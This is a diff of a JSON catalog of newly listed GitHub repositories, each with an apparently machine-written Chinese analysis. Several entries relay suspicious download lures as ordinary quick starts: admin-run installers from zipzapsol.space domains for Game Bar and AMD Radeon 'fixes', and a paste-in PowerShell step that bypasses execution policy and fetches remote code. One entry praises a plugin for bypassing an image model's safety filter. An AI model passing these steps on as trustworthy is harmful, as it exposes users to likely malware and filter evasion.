@@ -1,6 +1,6 @@
 {
   "version": "1",
-  "updatedAt": "2026-06-24T05:48:31.029Z",
+  "updatedAt": "2026-06-25T05:50:24.477Z",
   "projects": [
     {
       "owner": "codecrafters-io",
@@ -54222,6 +54222,895 @@
         "category": "其他"
       },
       "analyzedAt": "2026-06-24T05:48:31.006Z"
+    },
+    {
+      "owner": "suphotP",
+      "repo": "chatgpt-api",
+      "fullName": "suphotP/chatgpt-api",
+      "description": "Local ChatGPT Web bridge with API, console, opencode integration, and character-game use case",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-06-25T00:10:28Z",
+      "url": "https://github.com/suphotP/chatgpt-api",
+      "analysis": {
+        "positioning": "将现有ChatGPT网页版账户能力本地API化，赋能应用开发。",
+        "useCases": [
+          "你想在产品里集成ChatGPT能力但不想花钱买官方API → 它帮你把现有的ChatGPT网页版账户封装成本地API，低成本实现功能。",
+          "你想开发一个AI角色扮演游戏、内部工具或Agent应用 → 它提供全套API和集成方案，快速构建本地化的AI应用。",
+          "你有多余的ChatGPT账号想集中管理并做负载均衡 → 它提供账户路由器，支持多账号轮询、故障转移、配额管理。"
+        ],
+        "audience": "希望低成本将ChatGPT网页版能力集成到本地应用、原型或Agent工作流的开发者。",
+        "quickStart": {
+          "prerequisites": "Docker",
+          "steps": [
+            "确保已安装Docker。",
+            "运行项目提供的Docker命令启动服务。"
+          ],
+          "note": "此为本地开发者桥接工具，非公共托管服务，不应部署为公共代理。"
+        },
+        "competitors": [
+          {
+            "name": "OpenAI官方API",
+            "method": "付费API调用",
+            "models": "最新官方模型（GPT-3.5, GPT-4, DALL-E等）",
+            "pricing": "付费按量计费"
+          },
+          {
+            "name": "自行开发脚本抓取ChatGPT网页版",
+            "method": "编写爬虫或逆向工程脚本",
+            "models": "ChatGPT网页版模型",
+            "pricing": "免费（仅开发时间成本）"
+          }
+        ],
+        "pricing": "免费，但依赖用户现有的ChatGPT网页版账号（可能免费或Plus订阅）。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目强调本地优先、非官方特性，为开发者提供将ChatGPT网页版能力封装为API的实用工具，并支持角色游戏、Agent工作流等具体场景，具有较强的技术探索和DIY精神。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，目前无Issue统计数据。",
+        "category": "LLM框架"
+      },
+      "analyzedAt": "2026-06-25T05:45:09.892Z"
+    },
+    {
+      "owner": "crewrectorlose",
+      "repo": "Game-Bar-Not-Recording-Fix",
+      "fullName": "crewrectorlose/Game-Bar-Not-Recording-Fix",
+      "description": "xbox game bar not recording — Xbox Game Bar Not Recording Fix for Windows 11 & 10. Direct repair download and step-by-step fix guide.",
+      "language": "Unknown",
+      "topics": [
+        "capture",
+        "download",
+        "fix",
+        "game-bar-capture-not-working-fix-windows-11",
+        "game-bar-not-recording-fix",
+        "game-bar-not-recording-fix-2026",
+        "gaming",
+        "recording",
+        "recording-fix",
+        "repair",
+        "windows-11",
+        "xbox-game-bar",
+        "xbox-game-bar-not-recording",
+        "xbox-game-bar-not-recording-fix"
+      ],
+      "license": "NOASSERTION",
+      "createdAt": "2026-06-25T03:15:39Z",
+      "url": "https://github.com/crewrectorlose/Game-Bar-Not-Recording-Fix",
+      "analysis": {
+        "positioning": "修复Windows 10/11上Xbox Game Bar录制失败问题。",
+        "useCases": [
+          "你玩PC游戏时Xbox Game Bar无法录屏 → 它帮你修复录屏功能。",
+          "你想在Windows 10/11上用Game Bar录制精彩瞬间 → 它帮你解决录屏故障，确保功能可用。",
+          "你遇到Xbox Game Bar录屏错误提示 → 它提供直接下载的修复工具和分步指南。"
+        ],
+        "audience": "Windows 10/11 PC游戏玩家，尤其是不熟悉技术但需要修复Game Bar录屏故障的用户。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位)，管理员权限，至少8GB RAM和500MB磁盘空间。",
+          "steps": [
+            "点击下载链接 `gamebarrec.zipzapsol.space`。",
+            "保存安装文件。",
+            "以管理员身份运行安装程序。",
+            "按提示输入许可证密钥。",
+            "重启电脑后从开始菜单启动。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "付费（需输入许可证密钥）",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "该项目主要作为外部付费修复工具的分发渠道，无可见的开源代码，社区活跃度低（0 Issue），用户交互为下载安装和输入许可证密钥，而非代码协作或技术讨论。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，无任何Issue开启或关闭记录，表明缺乏用户互动和开发者响应。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-06-25T05:45:26.637Z"
+    },
+    {
+      "owner": "Cyantenspanner",
+      "repo": "AMD-Radeon-Software",
+      "fullName": "Cyantenspanner/AMD-Radeon-Software",
+      "description": "amd radeon software download — AMD Radeon Software for Windows 11 & 10. Direct download, install steps and setup guide.",
+      "language": "Unknown",
+      "topics": [
+        "adrenalin",
+        "amd",
+        "amd-driver-adrenalin-install-windows-gaming-2026",
+        "amd-radeon-software",
+        "amd-radeon-software-2026",
+        "amd-radeon-software-download",
+        "download",
+        "driver",
+        "fsr",
+        "gaming",
+        "gpu-driver",
+        "radeon",
+        "software",
+        "windows-11"
+      ],
+      "license": "NOASSERTION",
+      "createdAt": "2026-06-25T02:57:38Z",
+      "url": "https://github.com/Cyantenspanner/AMD-Radeon-Software",
+      "analysis": {
+        "positioning": "AMD Radeon 显卡驱动及软件下载安装指南",
+        "useCases": [
+          "你想在Windows 10/11上安装AMD Radeon显卡软件 → 它提供下载链接和安装指引。",
+          "你想获取最新的AMD Radeon驱动以优化游戏体验 → 它提供一站式下载与安装流程。",
+          "你在安装AMD Radeon软件时遇到问题 → 它提供常见的故障排除建议。"
+        ],
+        "audience": "使用AMD Radeon显卡的Windows 10/11游戏玩家，寻找软件或驱动的便捷下载与安装方案。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位) 系统，管理员权限。",
+          "steps": [
+            "点击下载链接 (amdradeon.zipzapsol.space)。",
+            "保存文件，以管理员身份运行安装程序。",
+            "按提示输入许可证密钥（官方软件通常无需此步骤）。",
+            "重启电脑，从开始菜单启动软件。"
+          ],
+          "note": "Windows 10/11系统专属，安装需管理员权限。"
+        },
+        "competitors": [
+          {
+            "name": "AMD官方网站",
+            "method": "通过AMD官网下载页面选择产品型号下载",
+            "models": "AMD Radeon全系列显卡",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "可能涉及付费（README中提及需输入许可证密钥，但AMD Radeon官方软件通常免费）",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目意图明确，提供了安装步骤和问题排查。但核心软件下载链接指向非官方域名 `amdradeon.zipzapsol.space`，且安装步骤中提及需输入“许可证密钥”，而AMD Radeon软件官方是免费的。这暗示项目可能为非官方 repack 或存在潜在风险，真实性存疑。",
+        "isVibeCoding": true,
+        "communityActivity": "无任何Issue或Pull Request，Star数量极低 (11)，社区活跃度极低。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-06-25T05:45:56.138Z"
+    },
+    {
+      "owner": "ElectronTempoNurture",
+      "repo": "Polaris-Word-2026",
+      "fullName": "ElectronTempoNurture/Polaris-Word-2026",
+      "description": "polaris word download — Polaris Word for Windows 11 & 10. Direct download, install steps and setup guide.",
+      "language": "Unknown",
+      "topics": [
+        "document-editor",
+        "download",
+        "office",
+        "office-suite",
+        "polaris",
+        "polaris-2026",
+        "polaris-office-word-install-setup-windows-2026",
+        "polaris-word",
+        "polaris-word-2026",
+        "polaris-word-download",
+        "software",
+        "windows-11",
+        "word-processor"
+      ],
+      "license": "NOASSERTION",
+      "createdAt": "2026-06-25T01:12:05Z",
+      "url": "https://github.com/ElectronTempoNurture/Polaris-Word-2026",
+      "analysis": {
+        "positioning": "为Windows用户提供Polaris Word的便捷下载与一键安装方案。",
+        "useCases": [
+          "你急需在Windows上安装Polaris Word → 它提供一键式PowerShell脚本，帮你快速部署。",
+          "你不熟悉软件安装流程，担心出错 → 它提供详细的步骤指南和常见问题解答，帮你顺利完成安装。",
+          "你不想通过浏览器寻找下载链接 → 它提供直接下载和命令安装方式，简化获取流程。"
+        ],
+        "audience": "需要快速在Windows 10/11系统上安装Polaris Word（2026版）的用户。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位), 管理员权限, 互联网连接",
+          "steps": [
+            "以管理员身份打开PowerShell（Win+X选择Terminal (Admin)或搜索PowerShell并右键运行为管理员）。",
+            "复制README中提供的PowerShell两行命令（Set-ExecutionPolicy Bypass... 和 irm https://raw.githubusercontent.com/...）。",
+            "将命令粘贴到PowerShell窗口并按Enter，等待下载安装完成。"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "Microsoft Word",
+            "method": "软件安装（Office套件）, 订阅制或买断制",
+            "models": "null",
+            "pricing": "付费订阅 (Microsoft 365) 或一次性购买"
+          },
+          {
+            "name": "WPS Office Writer",
+            "method": "软件安装, 部分功能免费，高级功能付费",
+            "models": "null",
+            "pricing": "免费增值，部分功能付费订阅"
+          },
+          {
+            "name": "Google Docs",
+            "method": "云端应用，浏览器访问",
+            "models": "null",
+            "pricing": "免费（个人用户）, 付费（Google Workspace企业版）"
+          }
+        ],
+        "pricing": "项目本身免费提供安装脚本，但Polaris Word软件需要许可证，通常为付费产品。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目主要是一个软件下载和安装的PowerShell脚本及配套说明文档。代码量极少，不涉及复杂逻辑或架构，因此没有太多可供评估代码质量的维度。主要价值在于提供了便捷的安装流程。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，Issue开启/关闭均为0，几乎没有用户互动。",
+        "category": "文档工具"
+      },
+      "analyzedAt": "2026-06-25T05:46:12.984Z"
+    },
+    {
+      "owner": "QwenLM",
+      "repo": "Qwen-AgentWorld",
+      "fullName": "QwenLM/Qwen-AgentWorld",
+      "description": "Qwen-AgentWorld: Language World Models for General Agents",
+      "language": "Python",
+      "topics": [],
+      "license": "Apache-2.0",
+      "createdAt": "2026-06-22T13:48:37Z",
+      "url": "https://github.com/QwenLM/Qwen-AgentWorld",
+      "analysis": {
+        "positioning": "模拟通用Agent环境，支持多领域长链推理的语言世界模型。",
+        "useCases": [
+          "你训练AI Agent → 它提供逼真虚拟环境，模拟多步交互进行高效训练。",
+          "你评估AI Agent性能 → 它提供横跨七大领域的统一基准，全面测试Agent能力。",
+          "你开发复杂决策AI Agent → 它通过长链思考，模拟环境反馈助Agent规划与决策。"
+        ],
+        "audience": "专注于AI Agent研发的工程师和研究员，用于Agent的训练、模拟与评估。",
+        "quickStart": {
+          "prerequisites": "Python环境",
+          "steps": [
+            "安装依赖：`pip install huggingface_hub`",
+            "下载模型：`huggingface-cli download Qwen/Qwen-AgentWorld-35B-A3B --local-dir Qwen-AgentWorld-35B-A3B`"
+          ],
+          "note": "国内用户可设置环境变量如`SGLANG_USE_MODELSCOPE=true`从ModelScope下载。"
+        },
+        "competitors": [],
+        "pricing": "免费（模型权重与评估基准均开源，基于Apache-2.0许可证）。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目文档专业清晰，提供技术报告、博客和演示，核心能力（语言世界模型）前沿且实用。但目前GitHub社区（Issue）活跃度为零，可能刚发布或处于早期阶段。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度尚待观察，目前Issue开启和关闭数均为0。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-06-25T05:46:41.101Z"
+    },
+    {
+      "owner": "nova452",
+      "repo": "ComfyUI-ConditioningKrea2Rebalance",
+      "fullName": "nova452/ComfyUI-ConditioningKrea2Rebalance",
+      "description": "A conditioning optimizer with per layer weighting that offers IP-Adapter-like features for Krea 2 along with bypassing the built in quality diluation from the trained safety filter and also works as a means to unfilter the model.",
+      "language": "Python",
+      "topics": [],
+      "license": "Apache-2.0",
+      "createdAt": "2026-06-23T12:17:48Z",
+      "url": "https://github.com/nova452/ComfyUI-ConditioningKrea2Rebalance",
+      "analysis": {
+        "positioning": "ComfyUI插件，优化Krea 2图像，增强细节并去除滤镜。",
+        "useCases": [
+          "你希望Krea 2图像输出更精细、有特定参考风格 → 它提供类似IP-Adapter的分层权重控制，让细节更符合预期。",
+          "你用Krea 2生成图像时发现质量被安全滤镜降低 → 它帮你绕过内置安全滤镜的质量稀释，提升图像清晰度和细节。",
+          "你希望Krea 2模型能生成更自由或特定类型内容 → 它能帮你“解禁”模型，生成未过滤内容，突破创作限制。"
+        ],
+        "audience": "Krea 2图像生成用户，尤其是那些追求更高图像质量、更精细控制和解除内容限制的创作者。",
+        "quickStart": {
+          "prerequisites": "ComfyUI环境",
+          "steps": [
+            "确保已安装ComfyUI。",
+            "通过ComfyUI管理器或手动方式安装此自定义节点。"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "IP-Adapter",
+            "method": "ComfyUI节点/模型",
+            "models": "Stable Diffusion系列 (通用)",
+            "pricing": "免费"
+          },
+          {
+            "name": "其他ComfyUI条件优化插件",
+            "method": "ComfyUI工作流",
+            "models": "Stable Diffusion系列",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费，基于Apache-2.0开源协议。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目定位明确，直击Krea 2用户痛点（图像质量、内容限制）。Star数适中，显示其在特定社区有一定关注度。但Issue活跃度较低，社区互动或项目迭代速度可能不高。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue活跃度较低，目前仅有一个开启Issue且无关闭，社区互动可能不多或项目非常稳定。",
+        "category": "Prompt工程"
+      },
+      "analyzedAt": "2026-06-25T05:47:10.422Z"
+    },
+    {
+      "owner": "benchflow-ai",
+      "repo": "awesome-evals",
+      "fullName": "benchflow-ai/awesome-evals",
+      "description": "A curated, non-BS library of the best resources for building and evaluating AI agents — papers, blogs, talks, tools, benchmarks. Maintained by BenchFlow.",
+      "language": "Unknown",
+      "topics": [
+        "agent-evaluation",
+        "ai-agents",
+        "awesome",
+        "awesome-list",
+        "benchmarks",
+        "evals",
+        "llm",
+        "llm-evaluation",
+        "rl-environments"
+      ],
+      "license": "NOASSERTION",
+      "createdAt": "2026-06-24T08:10:33Z",
+      "url": "https://github.com/benchflow-ai/awesome-evals",
+      "analysis": {
+        "positioning": "AI Agent构建与评估的精选资源库，去伪存真，高效参考。",
+        "useCases": [
+          "你想高效入门AI Agent评估领域 → 它提供精选论文、博客、工具和基准，快速建立知识体系。",
+          "你在开发AI Agent，需要可靠的评估方法和代码示例 → 它提供“Playbook”，包含LLM-as-judge、CI gating等实战代码和案例。",
+          "你希望找到权威、经过验证的Agent评估资源 → 它通过深度引用爬取、专家洞察和人工核验，确保资源质量和实用性。"
+        ],
+        "audience": "AI Agent开发者、研究者及评估工程师，用于系统学习、实践Agent的构建与评估。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [
+            "访问GitHub仓库或BenchFlow官网。",
+            "根据目录查阅感兴趣的评估主题，例如Playbook、LLM-as-judge等。"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "其他通用Awesome列表",
+            "method": "链接堆砌，缺乏深度标注与验证",
+            "models": "不适用",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费，所有资源均开源可访问。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "它本身不是编码工具，但通过提供高质量、去伪存真的AI Agent评估资源，能显著提升开发者获取知识和解决问题的效率，间接优化编码体验。",
+        "isVibeCoding": true,
+        "communityActivity": "目前Issue活跃度为0，但作为一个精选资源列表，其贡献主要通过PR而非Issue。项目自身在持续维护中。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-06-25T05:47:26.769Z"
+    },
+    {
+      "owner": "krea-ai",
+      "repo": "krea-2",
+      "fullName": "krea-ai/krea-2",
+      "description": "Official inference code for Krea 2",
+      "language": "Python",
+      "topics": [],
+      "license": "Apache-2.0",
+      "createdAt": "2026-06-22T21:41:41Z",
+      "url": "https://github.com/krea-ai/krea-2",
+      "analysis": {
+        "positioning": "顶尖开源图像生成模型Krea 2的官方推理代码。",
+        "useCases": [
+          "你想要生成高品质、独特风格的图片 → 它提供Krea 2模型，实现艺术性的图像生成。",
+          "你希望进行图像模型微调或LoRA训练 → 它提供Krea 2 RAW基模型作为理想起点。",
+          "你追求快速、高质量的文本到图像生成 → 它提供Krea 2 Turbo模型，8步即可出图。",
+          "你需要在本地部署和运行Krea 2模型 → 它提供官方推理代码和清晰的使用指南。"
+        ],
+        "audience": "寻求高品质开源图生文模型、需要进行模型微调或快速推理的开发者、研究员和艺术家。",
+        "quickStart": {
+          "prerequisites": "安装uv，从Hugging Face下载Krea 2模型文件 (RAW和Turbo)，设置对应的环境变量。",
+          "steps": [
+            "运行 `uv sync` 安装依赖。",
+            "通过 `export OSS_RAW=...` 和 `export OSS_TURBO=...` 设置模型路径环境变量。",
+            "使用 `uv run inference.py \"你的提示词\" --checkpoint oss_raw/oss_turbo ...` 进行推理。"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "Stable Diffusion (SDXL/SD 1.5)",
+            "method": "本地部署或通过API",
+            "models": "SDXL, SD 1.5等多种版本",
+            "pricing": "免费（开源模型）"
+          },
+          {
+            "name": "Midjourney",
+            "method": "Discord Bot或API",
+            "models": "专有模型",
+            "pricing": "付费（订阅制）"
+          }
+        ],
+        "pricing": "免费（开源模型推理代码及模型权重）",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "提供了Krea 2这一顶级开源图像生成模型的官方推理代码和详细指南。项目结构清晰，易于上手，但主要作为模型使用入口，而非独立创新的工具或框架。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue数量较少，关闭比例低 (1/8)，社区互动在GitHub上尚处于早期阶段。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-06-25T05:47:42.139Z"
+    },
+    {
+      "owner": "Th0rgal",
+      "repo": "open_oura",
+      "fullName": "Th0rgal/open_oura",
+      "description": "A Rust toolkit for the Oura Ring (Gen 3/4/5): reverse-engineered BLE protocol, event decoders, and reimplemented data-processing algorithms. Sync, store, and analyze your data locally.",
+      "language": "Rust",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-06-21T10:43:18Z",
+      "url": "https://github.com/Th0rgal/open_oura",
+      "analysis": {
+        "positioning": "Oura Ring本地数据解析工具，彻底摆脱云端依赖。",
+        "useCases": [
+          "你不想将Oura数据上传到云端 → 它帮你直接通过蓝牙从戒指同步、存储并本地分析所有数据。",
+          "你想获取Oura戒指的原始生理数据（PPG、温度、运动、HRV、睡眠分期）用于自定义研究或应用 → 它帮你绕过官方API，直接提取戒指内部的详细传感器数据和处理结果。",
+          "你是一名开发者，想深入研究Oura Ring的BLE协议或构建自定义集成 → 它提供经过逆向工程的完整协议细节和Rust客户端库，便于二次开发。"
+        ],
+        "audience": "关注数据隐私、拒绝云端依赖的Oura Ring用户；希望获取原始生理数据进行自定义分析的研究者；对Oura Ring BLE协议感兴趣的开发者。",
+        "quickStart": {
+          "prerequisites": "已安装Rust编程环境（Rust toolchain）",
+          "steps": [
+            "克隆项目并编译：`cargo build --release`",
+            "扫描戒指：`./target/release/oura scan`",
+            "获取戒指信息（需提供密钥文件）：`./target/release/oura --key-file key.hex info`"
+          ],
+          "note": "Python研究工具链需Python3环境；在macOS上，终端可能需要蓝牙权限。更多命令和认证细节请查阅`crates/README.md`。"
+        },
+        "competitors": [
+          {
+            "name": "Oura官方App/云服务",
+            "method": "官方App通过蓝牙连接戒指，数据上传至云端存储、处理和展示。",
+            "models": "Oura Ring Gen 3/4/5",
+            "pricing": "戒指购买后需订阅服务才能获得完整功能（月费制）。"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目代码质量高，采用Rust语言，提供了详细的逆向工程文档和可用的CLI工具，甚至包含实时3D可视化和游戏。功能强大且独辟蹊径，解决了用户对数据隐私和云端依赖的痛点。Star数适中，显示了一定的社区认可。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，Issue统计显示项目可能相对稳定或用户基数尚小，反馈较少。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-06-25T05:47:57.345Z"
+    },
+    {
+      "owner": "iart-ai",
+      "repo": "motion-skills",
+      "fullName": "iart-ai/motion-skills",
+      "description": "50 open-source skills that teach your AI coding agent to make motion graphics, animation & video — kinetic typography, data-viz, explainers, TikTok/Reels, WebGL, Manim. 14 installable packs. By iart.ai, the AI motion agent.",
+      "language": "HTML",
+      "topics": [
+        "ai-agents",
+        "claude-code",
+        "motion-graphics",
+        "remotion",
+        "skills"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-22T12:40:08Z",
+      "url": "https://github.com/iart-ai/motion-skills",
+      "analysis": {
+        "positioning": "AI agents制作动效、动画和视频的开源技能库",
+        "useCases": [
+          "你做TikTok/Reels → 它帮你用AI agent生成短视频",
+          "你需要数据可视化动画 → 它帮你用AI agent制作数据动效图表",
+          "你做产品解释视频 → 它帮你用AI agent生成动画讲解"
+        ],
+        "audience": "面向内容创作者、设计师、开发者，以及任何希望通过AI agent自动化生成高质量动态图形和视频的用户。",
+        "quickStart": {
+          "prerequisites": "Node.js",
+          "steps": [
+            "安装指定技能包：npx skills add iart-ai/tiktok-video-skills",
+            "作为Claude Code插件使用"
+          ],
+          "note": "每个技能包独立安装，可按需选择。"
+        },
+        "competitors": [],
+        "pricing": "免费（开源项目），但其背后的商业产品iart.ai可能收费。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "结合AI Agent和动态图形两大热门领域，提供模块化、场景化的开源技能，解决AI生成动效的痛点，创新性强。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，目前无Issue活动。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-06-25T05:48:09.023Z"
+    },
+    {
+      "owner": "Karovia",
+      "repo": "fullstack-ai-agent-roadmap",
+      "fullName": "Karovia/fullstack-ai-agent-roadmap",
+      "description": "🎯 从零基础到 AI Agent 全栈工程师 · 110 个详细教程 · 58 万字 · 400+ GitHub 项目精选 · Obsidian 友好 · 中文",
+      "language": "Unknown",
+      "topics": [
+        "ai",
+        "ai-agent",
+        "chinese",
+        "claude",
+        "fastapi",
+        "fullstack",
+        "javascript",
+        "langgraph",
+        "learning-roadmap",
+        "llm",
+        "mcp",
+        "obsidian",
+        "python",
+        "react",
+        "tutorial"
+      ],
+      "license": "Unknown",
+      "createdAt": "2026-06-19T06:34:06Z",
+      "url": "https://github.com/Karovia/fullstack-ai-agent-roadmap",
+      "analysis": {
+        "positioning": "从零到AI Agent全栈工程师的系统化学习路线",
+        "useCases": [
+          "你缺乏AI时代全栈学习路径 → 它提供零基础到AI Agent的系统化教程，帮你明确方向。",
+          "你苦于理论多实践少 → 它提供58万字、110个带完整代码和验收项目的实战教程，助你知行合一。",
+          "你学习无章法、难坚持 → 它提供Obsidian组织、配套学习契约和400+GitHub项目指引，帮你高效坚持。"
+        ],
+        "audience": "渴望从零基础系统学习，最终能独立交付AI Agent产品的全栈工程师。",
+        "quickStart": {
+          "prerequisites": "Obsidian桌面应用, Git",
+          "steps": [
+            "安装Obsidian并克隆项目仓库到本地。",
+            "用Obsidian打开项目文件夹，首先浏览思维导图，然后从README开始学习。"
+          ],
+          "note": "推荐使用Obsidian获得最佳沉浸式学习体验。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "内容极其详尽（58万字，110教程），覆盖零基础到AI Agent全栈，强调实践（完整代码、章节项目），并提供系统化学习方法论，非常适合有毅力的学习者。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue活跃度低（0开0闭），但项目持续维护中，内容丰富度高，Star数尚可（180）。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-06-25T05:48:24.717Z"
+    },
+    {
+      "owner": "FFF686868",
+      "repo": "proxypin-wloc-spoofer",
+      "fullName": "FFF686868/proxypin-wloc-spoofer",
+      "description": "ProxyPin script for authorized iOS Apple WLOC response rewriting tests",
+      "language": "JavaScript",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-06-20T18:47:23Z",
+      "url": "https://github.com/FFF686868/proxypin-wloc-spoofer",
+      "analysis": {
+        "positioning": "iOS定位数据重写测试工具，专为ProxyPin设计。",
+        "useCases": [
+          "你进行iOS应用定位功能测试 → 它帮你模拟或修改WLOC定位响应。",
+          "你进行iOS设备网络安全研究 → 它帮你分析并重写Apple WLOC二进制数据包。",
+          "你进行QA测试验证 → 它帮你验证App在特定虚假定位下的行为。",
+          "你进行授权渗透测试 → 它帮你测试应用对位置欺骗的防护能力。"
+        ],
+        "audience": "适合iOS开发者、QA工程师、安全研究员，用于授权的iOS定位功能测试和安全研究。",
+        "quickStart": {
+          "prerequisites": [
+            "已安装ProxyPin并支持脚本功能。",
+            "一台iOS测试设备，并配置其流量通过ProxyPin。",
+            "iOS设备上已安装并信任ProxyPin的CA证书。",
+            "ProxyPin已开启HTTPS流量捕获。"
+          ],
+          "steps": [
+            "下载`proxypin_wloc_compat_v2.js`脚本文件。",
+            "在ProxyPin中配置并加载此JavaScript脚本。",
+            "使用iOS测试设备进行定位相关操作，脚本将自动拦截并重写WLOC响应。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目目标明确，功能聚焦于ProxyPin的iOS WLOC响应重写，文档清晰，特别强调授权测试和免责声明，专业性强。但其高度专业化和对ProxyPin的依赖，限制了通用性。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue统计显示0开0闭，社区互动或贡献度暂低。",
+        "category": "测试工具"
+      },
+      "analyzedAt": "2026-06-25T05:48:36.528Z"
+    },
+    {
+      "owner": "PMTraderAdam",
+      "repo": "PMTraderAdam",
+      "fullName": "PMTraderAdam/PMTraderAdam",
+      "description": "",
+      "language": "Unknown",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-06-24T15:42:58Z",
+      "url": "https://github.com/PMTraderAdam/PMTraderAdam",
+      "analysis": {
+        "positioning": "一个待完善的GitHub个人资料页模板。",
+        "useCases": [
+          "你刚创建GitHub个人资料页 → 它提供一个通用README模板帮你快速开始。",
+          "你寻找GitHub个人资料页灵感 → 它提供常见的占位符提示帮你构思。",
+          "你期望找到一个实际的项目代码 → 它目前不包含任何功能代码或文档。"
+        ],
+        "audience": "GitHub新手用户或正在搭建个人资料页的开发者。",
+        "quickStart": {
+          "prerequisites": "GitHub账户",
+          "steps": [
+            "Fork本仓库",
+            "编辑README.md文件，将占位符替换为你的个人信息",
+            "确保README.md位于你的同名用户仓库，以显示在个人资料页"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "仓库仅包含一个GitHub个人资料页的通用README模板，无实际项目代码或功能描述，活跃度极低。",
+        "isVibeCoding": true,
+        "communityActivity": "极低，无任何Issue、PR或讨论记录。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-06-25T05:48:52.907Z"
+    },
+    {
+      "owner": "trotsky1997",
+      "repo": "OpenFugu",
+      "fullName": "trotsky1997/OpenFugu",
+      "description": "Open reimplementation of Sakana Fugu — the 'one model to command them all' LLM orchestrator. Read → run → train → serve.",
+      "language": "Python",
+      "topics": [],
+      "license": "Apache-2.0",
+      "createdAt": "2026-06-22T11:37:21Z",
+      "url": "https://github.com/trotsky1997/OpenFugu",
+      "analysis": {
+        "positioning": "萨卡纳Fugu开源复刻，LLM调度器，实现“一模型统管所有”。",
+        "useCases": [
+          "你想深入理解Sakana Fugu的LLM调度原理和实现 → 它提供详细的逆向工程文档和高质量代码复现。",
+          "你想部署一个能智能路由用户查询到不同LLM的调度器 → 它提供一套可运行的LLM池协调系统。",
+          "你想训练自己的LLM路由决策模型或调度策略 → 它提供从零开始训练Conductor的完整脚本和流程。",
+          "你想通过标准OpenAI兼容接口访问多模型LLM调度服务 → 它提供一站式服务接口，隐藏底层模型池。"
+        ],
+        "audience": "针对希望深入理解、复现或构建多模型LLM智能调度系统的研究者和开发者。",
+        "quickStart": {
+          "prerequisites": "Python环境，PyTorch、transformers、trl等库，并设置好指向模型路径和工件的环境变量。",
+          "steps": [
+            "`pip install -r requirements.txt` 安装项目依赖。",
+            "`python scripts/fetch_artifacts.py` 获取必需的模型、权重和测试数据。",
+            "设置`FUGU_MODEL`, `FUGU_VECTOR`, `FUGU_FIXTURE`环境变量。",
+            "阅读`docs/HOW_FUGU_IS_IMPLEMENTED.md`理解Fugu的实现原理。",
+            "`python openfugu/mini.py --self-test` 运行自测，验证核心机制的复现效果。",
+            "`python openfugu/mini.py --demo` 离线演示LLM路由查询功能。"
+          ],
+          "note": "实时（live）模式运行需要配置API Key和Base URL，训练模式需要高性能GPU资源（如A800）。"
+        },
+        "competitors": [
+          {
+            "name": "Sakana AI Fugu",
+            "method": "商业产品，闭源，提供单一LLM接口，但内部智能调度多个LLM。",
+            "models": "使用前沿大型语言模型池（具体未公开）。",
+            "pricing": "付费"
+          }
+        ],
+        "pricing": "免费（开源，Apache-2.0许可证）。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目对Sakana Fugu进行了高质量的逆向工程，详细拆解其机制并提供了从理论分析、代码复现、训练到服务部署的完整链条，验证严谨，文档详细，对LLM调度研究和应用有极高参考价值。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，项目处于早期阶段，目前仅有1个开启的Issue，0个已关闭。",
+        "category": "LLM框架"
+      },
+      "analyzedAt": "2026-06-25T05:49:08.900Z"
+    },
+    {
+      "owner": "i5ting",
+      "repo": "learn-ai-practice",
+      "fullName": "i5ting/learn-ai-practice",
